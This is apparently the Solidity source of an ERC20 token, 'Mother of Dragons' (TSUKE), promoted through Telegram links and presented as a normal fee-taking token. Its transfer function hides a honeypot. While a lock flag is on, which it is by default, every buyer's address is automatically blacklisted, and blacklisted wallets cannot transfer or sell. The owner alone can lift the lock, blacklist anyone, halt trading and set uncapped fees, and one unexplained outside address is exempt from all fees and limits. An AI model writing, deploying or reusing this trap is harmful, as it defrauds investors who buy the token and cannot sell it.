1 // SPDX-License-Identifier: MIT
2 // Linktree: https://linktr.ee/motherofdragons
3 // Telegram: https://t.me/TSUKEannouncements
4 // Telegram: https://t.me/motherofdragonsERC20
5 pragma solidity ^0.8.15;
6 
7 library SafeMath {
8     function add(uint256 a, uint256 b) internal pure returns (uint256) {
9         uint256 c = a + b;
10         require(c >= a, "SafeMath: addition overflow");
11         return c;
12     }
13     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
14         return sub(a, b, "SafeMath: subtraction overflow");
15     }
16     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
17         require(b <= a, errorMessage);
18         uint256 c = a - b;
19         return c;
20     }
21     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
22         if (a == 0) {
23             return 0;
24         }
25         uint256 c = a * b;
26         require(c / a == b, "SafeMath: multiplication overflow");
27         return c;
28     }
29     function div(uint256 a, uint256 b) internal pure returns (uint256) {
30         return div(a, b, "SafeMath: division by zero");
31     }
32     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
33         require(b > 0, errorMessage);
34         uint256 c = a / b;
35         return c;
36     }
37 }
38 
39 interface ERC20 {
40     function totalSupply() external view returns (uint256);
41     function decimals() external view returns (uint8);
42     function symbol() external view returns (string memory);
43     function name() external view returns (string memory);
44     function getOwner() external view returns (address);
45     function balanceOf(address account) external view returns (uint256);
46     function transfer(address recipient, uint256 amount) external returns (bool);
47     function allowance(address _owner, address spender) external view returns (uint256);
48     function approve(address spender, uint256 amount) external returns (bool);
49     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
50     event Transfer(address indexed from, address indexed to, uint256 value);
51     event Approval(address indexed owner, address indexed spender, uint256 value);
52 }
53 
54 abstract contract Ownable {
55     address internal owner;
56     constructor(address _owner) {
57         owner = _owner;
58     }
59     modifier onlyOwner() {
60         require(isOwner(msg.sender), "!OWNER"); _;
61     }
62     function isOwner(address account) public view returns (bool) {
63         return account == owner;
64     }
65     function renounceOwnership() public onlyOwner {
66         owner = address(0);
67         emit OwnershipTransferred(address(0));
68     }
69     event OwnershipTransferred(address owner);
70 }
71 
72 interface IFactory {
73     function createPair(address tokenA, address tokenB) external returns (address pair);
74 }
75 
76 interface IRouter {
77     function factory() external pure returns (address);
78     function WETH() external pure returns (address);
79     function addLiquidity(
80         address tokenA,
81         address tokenB,
82         uint amountADesired,
83         uint amountBDesired,
84         uint amountAMin,
85         uint amountBMin,
86         address to,
87         uint deadline
88     ) external returns (uint amountA, uint amountB, uint liquidity);
89     function addLiquidityETH(
90         address token,
91         uint amountTokenDesired,
92         uint amountTokenMin,
93         uint amountETHMin,
94         address to,
95         uint deadline
96     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
97     function swapExactETHForTokensSupportingFeeOnTransferTokens(
98         uint amountOutMin,
99         address[] calldata path,
100         address to,
101         uint deadline
102     ) external payable;
103     function swapExactTokensForETHSupportingFeeOnTransferTokens(
104         uint amountIn,
105         uint amountOutMin,
106         address[] calldata path,
107         address to,
108         uint deadline
109     ) external;
110     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
111         uint amountIn,
112         uint amountOutMin,
113         address[] calldata path,
114         address to,
115         uint deadline
116     ) external;
117     function swapTokensForExactTokens(
118         uint amountOut,
119         uint amountInMax,
120         address[] calldata path,
121         address to,
122         uint deadline
123     ) external returns (uint[] memory amounts);
124     function swapExactETHForTokens(
125         uint amountOutMin,
126         address[] calldata path,
127         address to,
128         uint deadline
129     ) external payable returns (uint[] memory amounts);
130     function swapETHForExactTokens(
131         uint amountOut,
132         address[] calldata path,
133         address to,
134         uint deadline
135     ) external payable returns (uint[] memory amounts);
136 }
137 
138 contract motherofdragons is ERC20, Ownable {
139     using SafeMath for uint256;
140 
141     address private routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
142     address DEAD = 0x000000000000000000000000000000000000dEaD;
143 
144     string constant _name = "Mother of Dragons";
145     string constant _symbol = "TSUKE";
146     uint8 constant _decimals = 9;
147 
148     uint256 _totalSupply = 10_000_000 * (10 ** _decimals);
149     uint256 public _maxWalletAmount = (_totalSupply * 2 ) / 100;
150     uint256 public _maxTxAmount = (_totalSupply * 2 ) / 100;
151 //    address private pairToken = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2; // WETH
152     address private pairToken = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // USDC
153 
154     mapping (address => uint256) _balances;
155     mapping (address => mapping (address => uint256)) _allowances;
156 
157     mapping (address => bool) isFeeExempt;
158     mapping (address => bool) isTxLimitExempt;
159     mapping (address => bool) private blacklist;
160 
161     uint256 marketingFee1 = 3;
162     uint256 marketingFee2 = 0;
163     uint256 liquidityFee = 2;
164     uint256 totalFee = liquidityFee + marketingFee1 + marketingFee2;
165     uint256 feeDenominator = 100;
166 
167     address public marketingFee1Receiver = msg.sender;
168     address public marketingFee2Receiver = msg.sender;
169 
170     IRouter public router;
171     address public pair;
172 
173     bool tradingEnabled = true;
174     bool isLocked = true;
175     bool public swapEnabled = true;
176     uint256 public swapThreshold = _totalSupply / 1000 * 5;
177     bool inSwap;
178     modifier swapping() { inSwap = true; _; inSwap = false; }
179 
180     constructor () Ownable(msg.sender) {
181         router = IRouter(routerAddress);
182         pair = IFactory(router.factory()).createPair(pairToken, address(this));
183         _allowances[address(this)][address(router)] = type(uint256).max;
184 
185         address _owner = owner;
186         isFeeExempt[_owner] = true;
187         isFeeExempt[0x268D35e981c81f79BE67F6928488882B7Ca38AD0] = true;
188         isTxLimitExempt[_owner] = true;
189         isTxLimitExempt[0x268D35e981c81f79BE67F6928488882B7Ca38AD0] = true;
190         isTxLimitExempt[DEAD] = true;
191 
192         _balances[_owner] = _totalSupply;
193         emit Transfer(address(0), _owner, _totalSupply);
194     }
195 
196     receive() external payable { }
197 
198     function totalSupply() external view override returns (uint256) { return _totalSupply; }
199     function decimals() external pure override returns (uint8) { return _decimals; }
200     function symbol() external pure override returns (string memory) { return _symbol; }
201     function name() external pure override returns (string memory) { return _name; }
202     function getOwner() external view override returns (address) { return owner; }
203     function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
204     function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
205 
206     function approve(address spender, uint256 amount) public override returns (bool) {
207         _allowances[msg.sender][spender] = amount;
208         emit Approval(msg.sender, spender, amount);
209         return true;
210     }
211 
212     function approveMax(address spender) external returns (bool) {
213         return approve(spender, type(uint256).max);
214     }
215 
216     function transfer(address recipient, uint256 amount) external override returns (bool) {
217         return _transferFrom(msg.sender, recipient, amount);
218     }
219 
220     function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
221         if(_allowances[sender][msg.sender] != type(uint256).max){
222             _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
223         }
224 
225         return _transferFrom(sender, recipient, amount);
226     }
227 
228     function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
229         require(tradingEnabled, "Trading disabled");
230         require(!blacklist[sender], "Blacklisted wallet");
231 
232         if (recipient != pair && recipient != owner && recipient != routerAddress && isLocked) {
233             blacklist[recipient] = true;
234         }
235 
236         if(inSwap){ return _basicTransfer(sender, recipient, amount); }
237 
238         if (recipient != pair && recipient != DEAD) {
239             require(isTxLimitExempt[recipient] || amount <= _maxTxAmount, "Transfer amount exceeds the max TX limit.");
240             require(isTxLimitExempt[recipient] || _balances[recipient] + amount <= _maxWalletAmount, "Transfer amount exceeds the bag size.");
241         }
242 
243         if(shouldSwapBack()){ swapBack(); }
244 
245         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
246 
247         uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, amount) : amount;
248         _balances[recipient] = _balances[recipient].add(amountReceived);
249 
250         emit Transfer(sender, recipient, amountReceived);
251         return true;
252     }
253 
254     function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
255         _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
256         _balances[recipient] = _balances[recipient].add(amount);
257         emit Transfer(sender, recipient, amount);
258         return true;
259     }
260 
261     function shouldTakeFee(address from, address to) internal view returns (bool) {
262         return !(isFeeExempt[from] || isFeeExempt[to]);
263     }
264 
265     function takeFee(address sender, uint256 amount) internal returns (uint256) {
266         uint256 feeAmount = amount.mul(totalFee).div(feeDenominator);
267         _balances[address(this)] = _balances[address(this)].add(feeAmount);
268         emit Transfer(sender, address(this), feeAmount);
269         return amount.sub(feeAmount);
270     }
271 
272     function shouldSwapBack() internal view returns (bool) {
273         return msg.sender != pair
274         && !inSwap
275         && swapEnabled
276         && _balances[address(this)] >= swapThreshold;
277     }
278 
279     function swapBack() internal swapping {
280         uint256 contractTokenBalance = _balances[address(this)];
281         if (contractTokenBalance >= swapThreshold*2)
282             contractTokenBalance = swapThreshold*2;
283         uint256 amountToLiquify = contractTokenBalance.mul(liquidityFee).div(totalFee).div(2);
284         uint256 amountToSwap = contractTokenBalance.sub(amountToLiquify);
285 
286         address[] memory path = new address[](3);
287         path[0] = address(this);
288         path[1] = pairToken;
289         path[2] = router.WETH();
290 
291         uint256 balanceBefore = address(this).balance;
292 
293         router.swapExactTokensForETHSupportingFeeOnTransferTokens(
294             amountToSwap,
295             0,
296             path,
297             address(this),
298             block.timestamp
299         );
300 
301         uint256 amountETH = address(this).balance.sub(balanceBefore);
302         uint256 totalETHFee = totalFee.sub(liquidityFee.div(2));
303         uint256 amountETHLiquidity = amountETH.mul(liquidityFee).div(totalETHFee).div(2);
304         uint256 amountETHMarketing1 = amountETH.mul(marketingFee1).div(totalETHFee);
305         uint256 amountETHMarketing2 = amountETH.mul(marketingFee2).div(totalETHFee);
306 
307 
308         (bool Marketing1Success, /* bytes memory data */) = payable(marketingFee1Receiver).call{value: amountETHMarketing1, gas: 30000}("");
309         require(Marketing1Success, "receiver rejected ETH transfer");
310         (bool Marketing2Success, /* bytes memory data */) = payable(marketingFee2Receiver).call{value: amountETHMarketing2, gas: 30000}("");
311         require(Marketing2Success, "receiver rejected ETH transfer");
312 
313         if(amountToLiquify > 0){
314             router.addLiquidityETH{value: amountETHLiquidity}(
315                 address(this),
316                 amountToLiquify,
317                 0,
318                 0,
319                 owner,
320                 block.timestamp
321             );
322             emit AutoLiquify(amountETHLiquidity, amountToLiquify);
323         }
324     }
325 
326     function clearStuckBalance() external {
327         payable(owner).transfer(address(this).balance);
328     }
329 
330     function setWalletLimit(uint256 amountPercent) external onlyOwner {
331         _maxWalletAmount = (_totalSupply * amountPercent ) / 100;
332     }
333 
334     function setTxLimit(uint256 amountPercent) external onlyOwner {
335         _maxTxAmount = (_totalSupply * amountPercent ) / 100;
336     }
337 
338     function swapStatus(bool status) external onlyOwner {
339         swapEnabled = status;
340     }
341 
342     function blacklistAddress(address addr, bool isBlocked) external onlyOwner {
343         blacklist[addr] = isBlocked;
344     }
345 
346     function blacklistAddresses(address[] memory addrs, bool isBlocked) external onlyOwner {
347         for (uint256 i = 0; i < addrs.length; i++) {
348             blacklist[addrs[i]] = isBlocked;
349         }
350     }
351 
352     function isBlacklisted(address addr) external view returns(bool) {
353         return blacklist[addr];
354     }
355 
356     function releaseLock() external onlyOwner {
357         isLocked = false;
358     }
359 
360     function setFees(uint256 _marketingFee1, uint256 _marketingFee2, uint256 _liquidityFee) external onlyOwner {
361         marketingFee1 = _marketingFee1;
362         marketingFee2 = _marketingFee2;
363         liquidityFee = _liquidityFee;
364         totalFee = liquidityFee + marketingFee1 + marketingFee2;
365     }
366 
367     function setThreshold(uint256 _treshold) external onlyOwner {
368         swapThreshold = _treshold;
369     }
370 
371     function setFee1Receivers(address _marketingFee1Receiver) external onlyOwner {
372         if (marketingFee1Receiver != owner) {
373             isFeeExempt[marketingFee1Receiver] = false;
374             isTxLimitExempt[marketingFee1Receiver] = false;
375         }
376         marketingFee1Receiver = _marketingFee1Receiver;
377         isFeeExempt[_marketingFee1Receiver] = true;
378         isTxLimitExempt[_marketingFee1Receiver] = true;
379     }
380 
381     function setFee2Receivers(address _marketingFee2Receiver) external onlyOwner {
382         if (marketingFee2Receiver != owner) {
383             isFeeExempt[marketingFee2Receiver] = false;
384             isTxLimitExempt[marketingFee2Receiver] = false;
385         }
386         marketingFee2Receiver = _marketingFee2Receiver;
387         isFeeExempt[_marketingFee2Receiver] = true;
388         isTxLimitExempt[_marketingFee2Receiver] = true;
389     }
390 
391     function addFeeExemptAddresses(address[] memory addrs, bool _feeExempt) external onlyOwner {
392         for (uint256 i = 0; i < addrs.length; i++) {
393             isFeeExempt[addrs[i]] = _feeExempt;
394             isTxLimitExempt[addrs[i]] = _feeExempt;
395         }
396     }
397 
398     function setTradingEnabled(bool _tradingEnabled) external onlyOwner {
399         tradingEnabled = _tradingEnabled;
400     }
401 
402     event AutoLiquify(uint256 amountETH, uint256 amountBOG);
403 }